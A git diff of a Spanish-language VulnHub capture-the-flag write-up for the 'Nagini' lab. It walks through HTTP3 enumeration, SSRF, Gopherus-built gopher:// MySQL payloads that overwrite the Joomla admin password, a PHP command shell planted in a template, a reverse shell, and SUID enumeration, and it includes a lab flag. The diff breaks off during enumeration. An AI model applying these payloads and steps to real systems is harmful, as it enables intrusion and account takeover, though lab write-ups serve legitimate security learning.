@@ -1,11 +1,11 @@
 ---
 layout: single
 title: Nagini - VulnHub
-excerpt: "."
+excerpt: "Esta fue una máquina bastante complicada para mí. Empezamos descubriendo únicamente 2 puertos abiertos, yéndonos directamente a aplicar Fuzzing al servicio HTTP, donde descubrimos que están ocupando Joomla y una nota que indica que usan HTTP3 Quic para almacenar una página web. Utilizando quiche 0.16.0, aplicamos una petición a esta página para ver su contenido, dándonos una ruta que podemos ver en el navegador. Entrando a esa ruta, resulta ser una página que se encarga de ver archivos web internos, por lo que aplicamos el ataque SSRF para apuntar a archivos internos. Además, enumeramos el CMS Joomla con joomscan, descubriendo un archivo .bak que contiene las credenciales de un usuario para el servicio MySQL. Con lo descubierto, usamos gopherus para crear payloads de MySQL que enumeren este servicio y también modifiquen la contraseña del administrador del Joomla. Entrando a Joomla, modificamos la plantilla Protostar para obtener una CMD y así aplicamos una Reverse Shell con la que ganamos acceso inicial a la máquina. Enumerando la máquina, descubrimos la credencial de un usuario al que pivoteamos y el binario cp dentro del directorio de otro usuario. Utilizamos ssh-keygen para crear una nueva llave de SSH que copiaremos dentro del segundo usuario. Una vez dentro del segundo usuario, descubrimos que tiene un directorio de Mozilla FireFox, siendo que es posible que almacene credenciales. Usamos dos herramientas para crackearlas y escalar privilegios a Root."
 date: 2024-11-11
 classes: wide
 header:
-  teaser: /assets/images/vulnhub-writeup-nagini/.png
+  teaser: /assets/images/vulnhub-writeup-nagini/Nagini-3.jpg
   teaser_home_page: true
   icon: /assets/images/vulnhub.png
 categories:
@@ -15,19 +15,52 @@ tags:
   - Linux
   - CMS Joomla
   - HTTP3 Quic
-  - Web Recognition
+  - Web Enumeration
+  - Server Side Request Forgery Attack (SSRF)
+  - Joomla Enumeration
+  - Information Leakage
+  - Gopherus MySQL Payloads
+  - MySQL Database Modification
+  - Joomla Exploitation Abusing Available Template
+  - Abusing SUID Binary
+  - Cracking FireFox Stored Credentials
+  - Privesc - Cracking FireFox Stored Credentials
+  - OSCP Style
 ---
-![](/assets/images/vulnhub-writeup-nagini/.png)
+![](/assets/images/vulnhub-writeup-nagini/nagini2.jpg)
 
-texto
+Esta fue una máquina bastante complicada para mí. Empezamos descubriendo únicamente 2 puertos abiertos, yéndonos directamente a aplicar **Fuzzing** al **servicio HTTP**, donde descubrimos que están ocupando **Joomla** y una nota que indica que usan **HTTP3 Quic** para almacenar una página web. Utilizando **quiche 0.16.0**, aplicamos una petición a esta página para ver su contenido, dándonos una ruta que podemos ver en el navegador. Entrando a esa ruta, resulta ser una página que se encarga de ver archivos web internos, por lo que aplicamos el **ataque SSRF** para apuntar a archivos internos. Además, enumeramos el **CMS Joomla con joomscan**, descubriendo un **archivo .bak** que contiene las credenciales de un usuario para el **servicio MySQL**. Con lo descubierto, usamos **gopherus** para crear **payloads de MySQL** que enumeren este servicio y también modifiquen la contraseña del administrador del **Joomla**. Entrando a **Joomla**, modificamos la **plantilla Protostar** para obtener una **CMD** y así aplicamos una **Reverse Shell** con la que ganamos acceso inicial a la máquina. Enumerando la máquina, descubrimos la credencial de un usuario al que pivoteamos y el **binario cp** dentro del directorio de otro usuario. Utilizamos **ssh-keygen** para crear una nueva llave de **SSH** que copiaremos dentro del segundo usuario. Una vez dentro del segundo usuario, descubrimos que tiene un directorio de **Mozilla FireFox**, siendo que es posible que almacene credenciales. Usamos dos herramientas para crackearlas y escalar privilegios a **Root**.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
-* **
-* **
-* **
-* **
+* *wappalizer*
+* *wfuzz*
+* *gobuster*
+* *curl*
+* *git*
+* *cp*
+* *cargo*
+* *quiche v0.16.0*
+* *http3-client*
+* *PHP*
+* *perl*
+* *joomscan*
+* *gopherus*
+* *md5sum*
+* *nc*
+* *script*
+* *bash*
+* *find*
+* *base64*
+* *ssh-keygen*
+* *chmod*
+* *ssh*
+* *wget*
+* *scp*
+* *python3*
+* *firefox_decrypt.py*
+* *firepwd.py*
 
 
 <br>
@@ -45,17 +78,24 @@ Herramientas utilizadas:
 			<ul>
 				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
 				<li><a href="#fuzz">Fuzzing</a></li>
-				<li><a href="#"></a></li>
-                                <li><a href="#"></a></li>
+				<li><a href="#HTTP3">Utilizando quiche 0.16.0 para Aplicar Peticiones a HTTP3 Quic</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#SSRF">Aplicando SSRF en la Ruta Descubierta</a></li>
+				<li><a href="#Joomla">Buscando Vulnerabilidades del CMS Joomla con joomscan</a></li>
+				<li><a href="#Gopherus">Utilizando ataque SSRF y Gopherus para Enumerar Base de Datos de MySQL</a></li>
+                                <li><a href="#Shell">Obteniendo Shell de la Máquina Modificando Plantilla Protostar de Joomla</a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
+				<li><a href="#Enumeracion">Enumeración de la Máquina</a></li>
+				<li><a href="#SSH">Ganando Acceso al Usuario Hermoine con Binario cp y Nueva Llave SSH de Usuario snape</a></li>
+                                <li><a href="#Mozilla">Crackeando Contraseña de Almacenada de Moziila para ser Root</a></li>
+				<ul>
+					<li><a href="#firefoxDecrypt">Utilizando firefox_decrypt.py para Obtener Credenciales Almacenadas de FireFox</a></li>
+                                	<li><a href="#firepwd">Utilizando firepwd.py para Crackear Credenciales de logins.json de FireFox</a></li>
+				</ul>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -183,7 +223,7 @@ Entremos:
 
 Solo vemos una imagen, es como en la **máquina Aragog**.
 
-Veamos que nos dice **Wappalizer**:
+Veamos qué nos dice **Wappalizer**:
 
 <p align="center">
 <img src="/assets/images/vulnhub-writeup-nagini/Captura2.png">
@@ -191,7 +231,7 @@ Veamos que nos dice **Wappalizer**:
 
 No nos dice mucho.
 
-No creo que podamos ver algo por aquí, entonces, vamos a aplicar **Fuzzing**:
+No creo que podamos ver algo por aquí, entonces, vamos a aplicar **Fuzzing**.
 
 <h2 id="fuzz">Fuzzing</h2>
 
@@ -261,9 +301,9 @@ Finished
 
 <br>
 
-Parece que esta ocupando el **servicio Joomla** y que yo recuerde, es la primera vez que me enfrento a este servicio.
+Parece que está ocupando el **servicio Joomla** y que yo recuerde, es la primera vez que me enfrento a este servicio.
 
-Investiguemos de que trata este servicio:
+Investiguemos de qué trata este servicio:
 
 | **Servicio Joomla** |
 |:-----------:|
@@ -277,7 +317,7 @@ Si lo visitamos, encontramos lo siguiente:
 <img src="/assets/images/vulnhub-writeup-nagini/Captura3.png">
 </p>
 
-Y podemos ver que nos dice **Wappalizer**:
+Y podemos ver qué nos dice **Wappalizer**:
 
 <p align="center">
 <img src="/assets/images/vulnhub-writeup-nagini/Captura4.png">
@@ -285,7 +325,7 @@ Y podemos ver que nos dice **Wappalizer**:
 
 Son muchas tecnologías, y veo que usa **PHP**, lo que nos puede ayudar bastante para la intrusión.
 
-Veamos que podemos encontrar aplicando **Fuzzing** al **servicio Joomla**:
+Veamos qué podemos encontrar aplicando **Fuzzing** al **CMS Joomla**:
 
 ```bash
 wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.006/joomla/FUZZ
@@ -325,7 +365,7 @@ Requests/sec.: 0
 
 Con **gobuster** encontramos lo mismo.
 
-Son varias cosiilas, pero en todas no podremos ver nada.
+Son varias cosillas, pero en todas no podremos ver nada.
 
 Quizá pasamos por alto algo en la página principal. Regresemos y veamos si no hay algún archivo **txt o PHP o HTML** que no hayamos visto:
 
@@ -376,7 +416,7 @@ Agrega el dominio al `/etc/hosts` e investiguemos eso del **HTTP3**.
 
 <br>
 
-Hay varias formas en las que podemos ver una página web que ocupa HTTP3, estas son:
+Hay varias formas en las que podemos ver una página web que ocupa **HTTP3 Quic**, estas son:
 * Actualizar **curl** para que pueda tramitar peticiones **HTTP3**: <a href="https://github.com/curl/curl/blob/master/docs/HTTP3.md" target="_blank">Repositorio de curl: HTTP3 Documents</a>
 * Utilizar la herramienta **quiche** para realizar las peticiones **HTTP3**: <a href="https://github.com/cloudflare/quiche" target="_blank">Repositorio de cloudfare: quiche</a>
 
@@ -400,14 +440,14 @@ curl: (56) Failed to connect to quic.nagini.hogwarts port 443 after 1 ms: Failur
 
 La otra opción sería usar **quiche**, pero tampoco nos va a funcionar.
 
-¿Por que? Pues porque la **máquina Nagini** tiene una versión desactualizada de **HTTP3** siendo que es del 2021, por lo que necesitaremos una versión de **quiche** de esas fechas, ya que si usamos una actual, tendra conflictos para ver el contenido del dominio.
+¿Por qué? Pues la **máquina Nagini** tiene una versión desactualizada de **HTTP3** siendo que es del 2021, por lo que necesitaremos una versión de **quiche** de esas fechas, ya que sí usamos una actual, tendrá conflictos para ver el contenido del dominio.
 
 Ocuparemos la **version 0.16.0**, la puedes descargar de los releases:
 * <a href="https://github.com/cloudflare/quiche/releases?page=2" target="_blank">Repositorio de cloudfare: quiche ver. 0.16.0</a>
 
 Aun así, ocuparemos la versión actual, ya que hace falta un directorio crucial para poder compilar las herramientas que vamos a ocupar de **quiche**, así que descarga ambos.
 
-Ya descagadas ambas versiones, sigue estos pasos:
+Ya descargadas ambas versiones, sigue estos pasos:
 * Elimina el **directorio boringssl** de la **versión 0.16.0**, ya que no tiene nada dentro. Se encuentra en la ruta: `quiche/deps/boringssl`:
 ```bash
 # Estoy dentro del directorio quiche-0.16.0
@@ -420,17 +460,17 @@ rm -r quiche/deps/boringssl
 cp -r ../quiche/quiche/deps/boringssl quiche/deps/.
 ```
 
-Quizá exista una mejor forma de hacer esto, pero a mi me funcionó.
+Quizá exista una mejor forma de hacer esto, pero a mí me funcionó.
 
-Con esto listoo, ya puedes aplicar los comandos para armar la herramienta:
+Con esto listo, ya puedes aplicar los comandos para armar la herramienta:
 ```bash
 cargo build --examples
 cargo test
 ```
 
-Te saldra uno que otro error, pero lo importante es que se compilo la herramienta que necesitamos. Esta se encuentra dentro del directorio `target/debug/examples` y se llama **http3-client**.
+Te saldrá uno que otro error, pero lo importante es que se compiló la herramienta que necesitamos. Esta se encuentra dentro del directorio `target/debug/examples` y se llama **http3-client**.
 
-Tan solo tienes que ejecutarla, añadiendole la URL que quieres ver:
+Tan solo tienes que ejecutarla, añadiéndole la URL que quieres ver:
 ```bash
 ./http3-client https://quic.nagini.hogwarts/
 <html>
@@ -452,9 +492,9 @@ Tan solo tienes que ejecutarla, añadiendole la URL que quieres ver:
 </html>
 ```
 
-Muy bien, funciono correctamente (tarde 2 dias y medio resolviendo este problema, te odio **HTTP3**).
+Muy bien, funcionó correctamente (tarde 2 días y medio resolviendo este problema, te odio **HTTP3**).
 
-Nos estan dando una ruta que podemos visitar y lo que parece ser una pista de que debemos buscar **archivos .bak**.
+Nos están dando una ruta que podemos visitar y lo que parece ser una pista de que debemos buscar **archivos .bak**.
 
 Pero primero visitemos esa ruta que nos mostraron.
 
@@ -484,7 +524,9 @@ Probemos a ver la página web de la máquina:
 <img src="/assets/images/vulnhub-writeup-nagini/Captura6.png">
 </p>
 
-La podemos ver, entonces tambien deberíamos poder ver la nota que encontramos antes:
+<br>
+
+La podemos ver, entonces también deberíamos poder ver la nota que encontramos antes:
 
 <p align="center">
 <img src="/assets/images/vulnhub-writeup-nagini/Captura7.png">
@@ -500,7 +542,7 @@ Es posible que esta página sea vulnerable al **ataque SSRF**:
 
 Podemos apuntar a un archivo local utilizando el esquema `file://`, ya que se puede interpretar como una **URL** y es un tipo de **URL** que señala archivos locales.
 
-Apliquemoslo, apuntando al `/etc/passwd`:
+Apliquémoslo, apuntando al `/etc/passwd`:
 
 <p align="center">
 <img src="/assets/images/vulnhub-writeup-nagini/Captura8.png">
@@ -508,19 +550,20 @@ Apliquemoslo, apuntando al `/etc/passwd`:
 
 Funciona.
 
-Podemos ver que hay por lo menos 3 usuarios: snape, ron y hermoine. Además, parece que esta ocupando el **servicio MySQL**.
+Podemos ver que hay por lo menos 3 usuarios: **snape, ron y hermoine**. Además, parece que está ocupando el **servicio MySQL**.
 
-Al estar funcionando internamenmte, podemos tratar de apuntar a un **archivo PHP** nuestro para que lo interprete la página y si funciona, tendríamos una forma de obtener una **Reverse Shell**.
+Al estar funcionando internamente, podemos tratar de apuntar a un **archivo PHP** nuestro para que lo interprete la página y, si funciona, tendríamos una forma de obtener una **Reverse Shell**.
 
 Probemos:
-* Crea un archivo PHP simple, ponle solo texto si lo deseas:
+
+* Crea un archivo **PHP** simple, ponle solo texto si lo deseas:
 ```php
 <?php
         echo 'hola papus/mamus del mundo';
 ?>
 ```
 
-* Abre un servidor de **Python** y desde la página web, apunta al archivo que creaste:
+* Abre un servidor de **Python** y, desde la página web, apunta al archivo que creaste:
 
 <p align="center">
 <img src="/assets/images/vulnhub-writeup-nagini/Captura11.png">
@@ -534,7 +577,7 @@ Probemos con uno de **HTML**:
 <img src="/assets/images/vulnhub-writeup-nagini/Captura12.png">
 </p>
 
-Este si funciona, pero no nos ayuda mucho que digamos. Entonces, de momento, esto no nos sirve de mucho.
+Este sí funciona, pero no nos ayuda mucho que digamos. Entonces, de momento, esto no nos sirve de mucho.
 
 Lo que podemos hacer, es buscar vulnerabilidades que tenga el **CMS Joomla**.
 
@@ -545,10 +588,10 @@ De acuerdo al siguiente blog:
 
 Podemos ocupar la herramienta **joomscan** para que busque vulnerabilidades en la página web.
 
-Puedes descargalo aquí:
+Puedes descargarlo aquí:
 * <a href="https://github.com/OWASP/joomscan" target="_blank">Repositorio de OWASP: joomscan</a>
 
-Sigue las instrucciones e instalalo.
+Sigue las instrucciones e instálalo.
 
 Ya instalado, vamos a indicarle la ruta que ocupa **Joomla** para que empiece a buscar vulnerabilidades:
 ```bash
@@ -621,11 +664,11 @@ http://192.168.1.006/joomla/tmp/
                                                                                                                                                                                                                  
 [+] Checking sensitive config.php.x file                                                                                                                                                                         
 [++] Readable config file is found                                                                                                                                                                               
- config file path : http://192.168.100.217/joomla/configuration.php.bak                                                                                                                                          
+ config file path : http://192.168.1.006/joomla/configuration.php.bak                                                                                                                                          
                                                                                                                                                                                                                  
-Your Report : reports/192.168.100.217/
+Your Report : reports/192.168.1.006/
 ```
-Excelente, parece que encontro un **archivo .bak** que justamente advirtieron no ponerlo en producción.
+Excelente, parece que encontró un **archivo .bak** que justamente advirtieron no ponerlo en producción.
 
 Vamos a verlo:
 
@@ -633,9 +676,9 @@ Vamos a verlo:
 <img src="/assets/images/vulnhub-writeup-nagini/Captura10.png">
 </p>
 
-Se descargo automaticamente.
+Se descargó automáticamente.
 
-Mandalo a tu directorio de trabajo y analizalo:
+Mándalo a tu directorio de trabajo y analízalo:
 ```php
 <?php
 class JConfig {
@@ -682,21 +725,21 @@ class JConfig {
 }
 ```
 
-No viene mucho, a excepción de un usuario y contraseña para la base de datos de **MySQL** que están ocupando.
+No viene mucho, a excepción de un usuario llamado **goblin** y su contraseña que está vacía para la base de datos de **MySQL** que están ocupando.
 
 Aun así, no podemos hacer nada de momento.
 
-<h2 id="">Utilizando ataque SSRF y Gopherus para Enumerar Base de Datos de MySQL</h2>
+<h2 id="Gopherus">Utilizando Ataque SSRF y Gopherus para Enumerar Base de Datos de MySQL</h2>
 
-Buscando por la biblia **HackTricks**, nos dice que podemos usar **Gopherus** para crear payloads aplicables a MySQL, PostgreSQL, FastCGI, etc:
+Buscando por la biblia **HackTricks**, nos dice que podemos usar **Gopherus** para crear payloads aplicables a **MySQL, PostgreSQL, FastCGI**, etc:
 * <a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#tools" target="_blank">HackTricks: SSRF - Tools</a>
 
-Podemos visitar el blog del creado de **Gopherus** y ahí viene el link para ir al GitHub de la herramienta.
+Podemos visitar el blog del creado de **Gopherus** y ahí viene el link para ir al **GitHub** de la herramienta.
 
 Igual te lo pongo aquí para que lo descargues:
 * <a href="https://github.com/tarunkant/Gopherus" target="_blank">Repositorio de tarunkant: Gopherus</a>
 
-Instalala y ejecutala:
+Instálala y ejecútala:
 ```bash
 gopherus
 
@@ -719,11 +762,11 @@ optional arguments:
 None
 ```
 
-El mismo **GitHub** nos lo dice, si llegamos a encontrar una página vulnerable al **ataque SSRF**, que además sabemos que ocupa el **servicio MySQL**, entonces, podemos usar **Gopherus** para crear payloads y obtener un **RCE**.
+El mismo **GitHub** nos lo dice: si llegamos a encontrar una página vulnerable al **ataque SSRF**, que además sabemos que ocupa el **servicio MySQL**, entonces, podemos usar **Gopherus** para crear payloads y obtener un **RCE**.
 
-Usemos la herramienta para que nos cree un payload para **MySQL** y veamos que obtenemos al usarlo en la página vulnerable:
+Usemos la herramienta para que nos cree un payload para **MySQL** y veamos qué obtenemos al usarlo en la página vulnerable:
 
-Al usar la herramienta, nos pedira un usuario que no tenga una contraseña, este ya lo tenemos gracias al **archivo .bak** y luego nos pide la query que queremos usar. Usaremos la query `show databases;`, para ver todas las bases de datos almacenadas:
+Al usar la herramienta, nos pedirá un usuario que no tenga una contraseña. Este ya lo tenemos gracias al **archivo .bak** y luego nos pide la query que queremos usar. Usaremos la query `show databases;`, para ver todas las bases de datos almacenadas:
 ```bash
 gopherus --exploit mysql
 
@@ -747,7 +790,7 @@ Your gopher link is ready to do SSRF :
 gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01
 ```
 
-Copia y pega ese payload en la página vulnerable y cargalo varias veces para funcione:
+Copia y pega ese payload en la página vulnerable y cárgalo varias veces para que funcione:
 
 <p align="center">
 <img src="/assets/images/vulnhub-writeup-nagini/Captura13.png">
@@ -777,13 +820,13 @@ Your gopher link is ready to do SSRF :
 gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%19%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%20%73%68%6f%77%20%74%61%62%6c%65%73%3b%01%00%00%00%01
 ```
 
-Lo mismo, copia y pega ese payload en la página vulnerable y cargalo varias veces para funcione:
+Lo mismo que lo anterior:
 
 <p align="center">
 <img src="/assets/images/vulnhub-writeup-nagini/Captura14.png">
 </p>
 
-Al final, esta una tabla llamada **joomla_users**. Hagamos el mismo procedimiendo, usemos la query `use joomla; select * from joomla_users`:
+Al final, está una tabla llamada **joomla_users**. Hagamos el mismo procedimiento, usemos la query `use joomla; select * from joomla_users`:
 ```bash
 gopherus --exploit mysql
 
@@ -813,15 +856,148 @@ Lo mismo:
 <img src="/assets/images/vulnhub-writeup-nagini/Captura15.png">
 </p>
 
-Obtuvimos un usuario llamado site_admin, que al parecer es un super usuario y el hash de su contraseña.
+Obtuvimos un usuario llamado **site_admin**, que al parecer es un superusuario y el hash de su contraseña.
 
 Podríamos tratar de crackear el hash, pero esto no va a funcionar.
 
-Lo que haremos, será cambiar la contraseña del super usuario, para poder entrar al login de **Joomla**.
+Lo que haremos, será cambiar la contraseña del superusuario, para poder entrar al login de **Joomla**.
+
+Para hacer esto, necesitamos saber si tenemos los privilegios suficientes para poder modificar la BD de **Joomla**. Esto lo podemos hacer con la siguiente query `show grants for 'goblin'@'localhost';`. Esta query nos da los privilegios de nuestro usuario. 
+```bash
+gopherus --exploit mysql
 
 
+  ________              .__
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______
+/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
+\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
+ \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
+        \/       |__|        \/     \/                 \/
 
-<h2 id=""></h2>
+                author: $_SpyD3r_$
+
+For making it work username should not be password protected!!!
+
+Give MySQL username: goblin
+Give query to execute: show grants for 'goblin'@'localhost';
+
+Your gopher link is ready to do SSRF : 
+
+gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%26%00%00%00%03%73%68%6f%77%20%67%72%61%6e%74%73%20%66%6f%72%20%27%67%6f%62%6c%69%6e%27%40%27%6c%6f%63%61%6c%68%6f%73%74%27%3b%01%00%00%00%01
+```
+
+La subimos y observamos la respuesta:
+
+<p align="center">
+<img src="/assets/images/vulnhub-writeup-nagini/Captura16.png">
+</p>
+
+Tenemos todos los privilegios activados para la **BD de Joomla**, por lo que podemos cambiar lo que queramos.
+
+Cambiemos la contraseña del superusuario **site_admin**.
+
+La contraseña debe ir cifrada con **MD5** para que funcione, y lo podemos hacer con la herramienta **md5sum** más la contraseña en texto claro:
+```bash
+echo -n "hackeado123" | md5sum
+779d861feba9f80b974837b135f183fa  -
+```
+
+Y ahora sí, con la siguiente query actualizamos la contraseña del superusuario **site_admin**: `use joomla; update joomla_users set password='779d861feba9f80b974837b135f183fa' where username='site_admin';`. Aplícala:
+
+```bash
+gopherus --exploit mysql
+                                                                                                                                                                                                                 
+  ________              .__                                                                                                                                                                                      
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______                                                                                                                                                       
+/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                                                                                                                                                       
+\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                                                                                                                                                        
+ \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                                                                                                                                                       
+        \/       |__|        \/     \/                 \/                                                                                                                                                        
+                                                                                                                                                                                                                 
+                author: $_SpyD3r_$                                                                                                                                                                               
+                                                                                                                                                                                                                 
+For making it work username should not be password protected!!!
+
+Give MySQL username: goblin                                                                                                                                                                                      
+Give query to execute: use joomla; update joomla_users set password='779d861feba9f80b974837b135f183fa' where username='site_admin';
+
+Your gopher link is ready to do SSRF :                                                                                                                                                                           
+                                                                                                                                                                                                                 
+gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%6d%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%20%75%70%64%61%74%65%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%20%73%65%74%20%70%61%73%73%77%6f%72%64%3d%27%37%37%39%64%38%36%31%66%65%62%61%39%66%38%30%62%39%37%34%38%33%37%62%31%33%35%66%31%38%33%66%61%27%20%77%68%65%72%65%20%75%73%65%72%6e%61%6d%65%3d%27%73%69%74%65%5f%61%64%6d%69%6e%27%3b%01%00%00%00%01
+```
+
+Súbela y revisa bien que tengas el mensaje de cambio en la tabla:
+
+<p align="center">
+<img src="/assets/images/vulnhub-writeup-nagini/Captura17.png">
+</p>
+
+Parece que sí se cambió.
+
+Vamos a comprobarlo, entrando al login del administrador en la ruta `joomla/administrator` que ya habíamos encontrado con **wfuzz y joomscan**:
+
+<p align="center">
+<img src="/assets/images/vulnhub-writeup-nagini/Captura18.png">
+</p>
+
+Y estamos dentro:
+
+<p align="center">
+<img src="/assets/images/vulnhub-writeup-nagini/Captura19.png">
+</p>
+
+<br>
+
+<h2 id="Shell">Obteniendo Shell de la Máquina Modificando Plantilla Protostar de Joomla</h2>
+
+De acuerdo con la biblia **HackTricks**, podemos modificar la plantilla **Protostar** para introducir código **PHP** que nos ayude a obtener una **CMD**.
+
+Revísalo aquí:
+* <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce" target="_blank">HackTricks: Joomla - RCE</a>
+
+Vamos a aplicarlo por pasos:
+* Vamos a la sección **Extensions** y luego **Templates**:
+
+<p align="center">
+<img src="/assets/images/vulnhub-writeup-nagini/Captura20.png">
+</p>
+
+* Ahora, seleccionamos la plantilla **Protostar**:
+
+<p align="center">
+<img src="/assets/images/vulnhub-writeup-nagini/Captura21.png">
+</p>
+
+* La página que usaremos para inyectar la **CMD**, será la de **error.php**:
+
+<p align="center">
+<img src="/assets/images/vulnhub-writeup-nagini/Captura22.png">
+</p>
+
+* Guarda y con **curl** podemos probar si funcionó:
+```bash
+curl -s http://192.168.1.006/joomla/templates/protostar/error.php?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+Excelente, si funcionó.
+
+* Abre una **netcat** y desde el navegador, usamos nuestra **Reverse Shell** de confianza para **Bash** (recuerda que hay que URL encodear los ampersands):
+
+<p align="center">
+<img src="/assets/images/vulnhub-writeup-nagini/Captura23.png">
+</p>
+
+```bash
+nc -nlvp 443
+listening on [any] 443 ...
+connect to [Tu_IP] from (UNKNOWN) [192.168.1.006] 46042
+bash: cannot set terminal process group (538): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@Nagini:/var/www/html/joomla/templates/protostar$ whoami
+whoami
+www-data
+```
+Listo, obtuvimos una shell hacia la máquina.
 
 
 <br>
@@ -833,10 +1009,390 @@ Lo que haremos, será cambiar la contraseña del super usuario, para poder entra
 <br>
 
 
-<h2 id=""></h2>
+<h2 id="Enumeracion">Enumeración de la Máquina</h2>
+
+Antes que nada, obten una sesión interactiva:
+```bash
+www-data@Nagini:/home$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@Nagini:/home$ ^Z                
+zsh: suspended  nc -nlvp 443
+                                                                                                                                                                                                                 
+❯ stty raw -echo; fg
+[1]  + continued  nc -nlvp 443
+                              reset xterm
+www-data@Nagini:/home$ export TERM=xterm
+www-data@Nagini:/home$ export SHELL=bash
+www-data@Nagini:/home$ stty rows 51 columns 189
+www-data@Nagini:/home$
+```
+
+Si nos vamos al directorio `/var/www/html`, encontraremos el primer horocrux:
+```bash
+snape@Nagini:/home/hermoine/bin$ cd /var/www/html/
+snape@Nagini:/var/www/html$ ls
+harry_potter_2.jpg  horcrux1.txt  index.html  index.nginx-debian.html  internalResourceFeTcher.php  joomla  note.txt
+snape@Nagini:/var/www/html$ cat horcrux1.txt 
+horcrux_{MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm9ZZUQgYlkgUm9O}
+```
+
+Veamos si tenemos algún privilegio:
+```bash
+www-data@Nagini:/home$ sudo -l
+sudo -l
+bash: sudo: command not foun
+```
+No tenemos.
+
+Busquemos si hay un binario que tenga **permisos SUID**:
+```bash
+www-data@Nagini:/home$ find / -perm -4000 2>/dev/null
+find / -perm -4000 2>/dev/null
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/home/hermoine/bin/su_cp
+```
+Parece que hay uno.
+
+Antes de revisarlo, dentro de `/home` hay dos directorios:
+```bash
+www-data@Nagini:/home$ ls
+hermoine  snape
+```
+
+Veamos el de **snape**:
+```bash
+www-data@Nagini:/home$ cd snape
+www-data@Nagini:/home/snape$ ls -la
+total 32
